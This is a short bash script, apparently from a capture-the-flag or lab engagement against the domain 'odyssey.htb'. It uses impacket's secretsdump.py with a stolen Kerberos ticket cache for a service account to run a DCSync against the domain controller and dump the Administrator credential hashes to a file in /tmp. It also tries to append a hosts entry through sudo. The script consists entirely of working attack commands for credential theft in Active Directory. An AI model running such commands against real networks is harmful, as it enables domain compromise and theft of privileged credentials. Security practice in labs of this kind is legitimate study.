#!/bin/bash
set -x
export PYTHONPATH=/tmp/pylibs
export KRB5CCNAME=/tmp/svc-aegis-stream.ccache
head -5 /tmp/pylibs/impacket/examples/secretsdump.py
echo '==== script entry ===='
head -5 /tmp/pylibs/impacket-0.13.1.data/scripts/secretsdump.py
echo '==== try scripts version ===='
python3 /tmp/pylibs/impacket-0.13.1.data/scripts/secretsdump.py -h 2>&1 | head -25
echo '==== actual dcsync ===='
# ensure hosts resolution via /etc/hosts if writable, else use IP-only target form
grep -q odyssey.htb /etc/hosts 2>/dev/null || echo '172.16.0.10 dc01.odyssey.htb odyssey.htb' | sudo tee -a /etc/hosts >/dev/null 2>&1 || true
python3 /tmp/pylibs/impacket-0.13.1.data/scripts/secretsdump.py -k -no-pass -dc-ip 172.16.0.10 'odyssey.htb/svc-aegis-stream@dc01.odyssey.htb' -just-dc-user Administrator 2>&1 | tee /tmp/dcsync3.out
echo DCSYNC3_DONE
